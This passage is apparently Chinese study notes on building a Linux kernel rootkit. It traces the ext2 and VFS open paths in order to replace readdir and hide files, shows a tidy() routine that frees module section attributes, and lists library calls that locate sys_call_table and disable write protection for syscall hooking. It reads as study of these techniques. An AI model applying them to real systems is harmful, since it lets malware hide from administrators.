        ret = -ESTALE;
        goto bad_inode;
    }
    inode->i_blocks = le32_to_cpu(raw_inode->i_blocks);
    ei->i_flags = le32_to_cpu(raw_inode->i_flags);
    ei->i_faddr = le32_to_cpu(raw_inode->i_faddr);
    ei->i_frag_no = raw_inode->i_frag;
    ei->i_frag_size = raw_inode->i_fsize;
    ei->i_file_acl = le32_to_cpu(raw_inode->i_file_acl);
    ei->i_dir_acl = 0;
    if (S_ISREG(inode->i_mode))
        inode->i_size |= ((__u64)le32_to_cpu(raw_inode->i_size_high)) << 32;
    else
        ei->i_dir_acl = le32_to_cpu(raw_inode->i_dir_acl);
    ei->i_dtime = 0;
    inode->i_generation = le32_to_cpu(raw_inode->i_generation);
    ei->i_state = 0;
    ei->i_block_group = (ino - 1) / EXT2_INODES_PER_GROUP(inode->i_sb);
    ei->i_dir_start_lookup = 0;

    /*
     * NOTE! The in-memory inode i_data array is in little-endian order
     * even on big-endian machines: we do NOT byteswap the block numbers!
     */
    for (n = 0; n < EXT2_N_BLOCKS; n++)
        ei->i_data[n] = raw_inode->i_block[n];
///下面是我们关心的。。。。。。。。。。。。。。。。。。。。。。。。
///这里对inode->fop赋值，就是inode中的file_operations结构。
    if (S_ISREG(inode->i_mode)) {   ///普通文件(S_ISREG)，inode->i_fop为ext2_file_operations函数集
        inode->i_op = &ext2_file_inode_operations;
        if (ext2_use_xip(inode->i_sb)) {   ///???现在不关心
            inode->i_mapping->a_ops = &ext2_aops_xip;
            inode->i_fop = &ext2_xip_file_operations;
        } else if (test_opt(inode->i_sb, NOBH)) {
            inode->i_mapping->a_ops = &ext2_nobh_aops;
            inode->i_fop = &ext2_file_operations;
        } else {
            inode->i_mapping->a_ops = &ext2_aops;
            inode->i_fop = &ext2_file_operations;
        }
    } else if (S_ISDIR(inode->i_mode)) {   ///目录文件(S_ISDIR)，inode->i_fop为ext2_dir_operations函数集
        inode->i_op = &ext2_dir_inode_operations;
        inode->i_fop = &ext2_dir_operations;
        if (test_opt(inode->i_sb, NOBH))
            inode->i_mapping->a_ops = &ext2_nobh_aops;
        else
            inode->i_mapping->a_ops = &ext2_aops;
    } else if (S_ISLNK(inode->i_mode)) {   ///链接文件(S_ISLNK)，不需要inode->i_fop函数集
        if (ext2_inode_is_fast_symlink(inode))
            inode->i_op = &ext2_fast_symlink_inode_operations;
        else {
            inode->i_op = &ext2_symlink_inode_operations;
            if (test_opt(inode->i_sb, NOBH))
                inode->i_mapping->a_ops = &ext2_nobh_aops;
            else
                inode->i_mapping->a_ops = &ext2_aops;
        }
    } else {
        inode->i_op = &ext2_special_inode_operations;
        if (raw_inode->i_block[0])
            init_special_inode(inode, inode->i_mode,
               old_decode_dev(le32_to_cpu(raw_inode->i_block[0])));
        else
            init_special_inode(inode, inode->i_mode,
               new_decode_dev(le32_to_cpu(raw_inode->i_block[1])));
    }
    ///以上。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
    brelse (bh);
    ext2_set_inode_flags(inode);
    unlock_new_inode(inode);
    return inode;

bad_inode:
    iget_failed(inode);
    return ERR_PTR(ret);
}
```

 上面一段代码把inode中的file_operations赋值为ext2_file_operations。 

 打开文件用sys_open()，在fs/open.c文件中，函数调用流程如下：
sys_open() --> do_sys_open() --> do_filp_open() --> nameidata_to_filp() --> __dentry_open() 

```
static struct file *__dentry_open(struct dentry *dentry, struct vfsmount *mnt,
                    int flags, struct file *f,
                    int (*open)(struct inode *, struct file *))
{
    struct inode *inode;
    int error;

    f->f_flags = flags;
    f->f_mode = ((flags+1) & O_ACCMODE) | FMODE_LSEEK |
                FMODE_PREAD | FMODE_PWRITE;
    inode = dentry->d_inode;
    if (f->f_mode & FMODE_WRITE) {
        error = __get_file_write_access(inode, mnt);
        if (error)
            goto cleanup_file;
        if (!special_file(inode->i_mode))
            file_take_write(f);
    }

    f->f_mapping = inode->i_mapping;
    f->f_path.dentry = dentry;
    f->f_path.mnt = mnt;
    f->f_pos = 0;
    f->f_op = fops_get(inode->i_fop);   ///把inode中file_operations函数集给file中file_operations函数集
    file_move(f, &inode->i_sb->s_files);

    error = security_dentry_open(f);
    if (error)
        goto cleanup_all;

    if (!open && f->f_op)
        open = f->f_op->open;
    if (open) {
        error = open(inode, f);
        if (error)
            goto cleanup_all;
    }

    f->f_flags &= ~(O_CREAT | O_EXCL | O_NOCTTY | O_TRUNC);

    file_ra_state_init(&f->f_ra, f->f_mapping->host->i_mapping);

    /* NB: we're sure to have correct a_ops only after f_op->open */
    if (f->f_flags & O_DIRECT) {
        if (!f->f_mapping->a_ops ||
            ((!f->f_mapping->a_ops->direct_IO) &&
            (!f->f_mapping->a_ops->get_xip_mem))) {
            fput(f);
            f = ERR_PTR(-EINVAL);
        }
    }

    return f;

cleanup_all:
    fops_put(f->f_op);
    if (f->f_mode & FMODE_WRITE) {
        put_write_access(inode);
        if (!special_file(inode->i_mode)) {
            /*
             * We don't consider this a real
             * mnt_want/drop_write() pair
             * because it all happenend right
             * here, so just reset the state.
             */
            file_reset_write(f);
            mnt_drop_write(mnt);
        }
    }
    file_kill(f);
    f->f_path.dentry = NULL;
    f->f_path.mnt = NULL;
cleanup_file:
    put_filp(f);
    dput(dentry);
    mntput(mnt);
    return ERR_PTR(error);
}
```

 在这儿，f->f_op = fops_get(inode->i_fop); 把file结构中的file_operations函数集赋值成inode中的函数集，也就是ext2_file_operations。 

 下面归纳下ls执行的整个流程：
假设当前目录在ext2文件系统上，ls要查看当前目录下的文件，
1.open打开当前目录的句柄，这个句柄对应内核中一个file结构。
  file结构中的file_operations函数集从inode结构中获得，就是ext2_file_operations
2.getdents64调用file->f_op->readdir()实际上是调用了ext2_file_operations中的readdir()，
  由ext2文件系统驱动读取当前目录下面的文件项。

我们要隐藏一个文件，要做的就是替换file->f_op->readdir()，也就是替换ext2_file_operations中的readdir()。 



**tidy()**

```
static inline void
tidy(void)
{
//	kfree(THIS_MODULE->notes_attrs);
//	THIS_MODULE->notes_attrs = NULL;
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
//	kfree(THIS_MODULE->mkobj.mp);
//	THIS_MODULE->mkobj.mp = NULL;
//	THIS_MODULE->modinfo_attrs->attr.name = NULL;
//	kfree(THIS_MODULE->mkobj.drivers_dir);
//	THIS_MODULE->mkobj.drivers_dir = NULL;
}
```



## Zeroevil库的使用



```
unsigned long **
get_sct(void);     //获取sys_call_table地址，调用get_sct_via_sys_close

unsigned long **
get_sct_via_sys_close(void);  //暴力搜索内存空间找到地址


void
disable_wp(void)     //关闭写保护，需要上锁

void
enable_wp(void)     //开启写保护，需要上锁



void
print_process_list(void)  //打印进程列表
```





在hook open的时候需要注意内核态数据和用户态数据不能互通，hook kill函数是成功的，因为它直接传pid值给kill，而open传进来的filename是一个指针



```
static __always_inline unsigned long __must_check
copy_from_user(void *to, const void __user *from, unsigned long n)
{
	if (likely(check_copy_size(to, n, false)))
		n = _copy_from_user(to, from, n);
	return n;
}
```

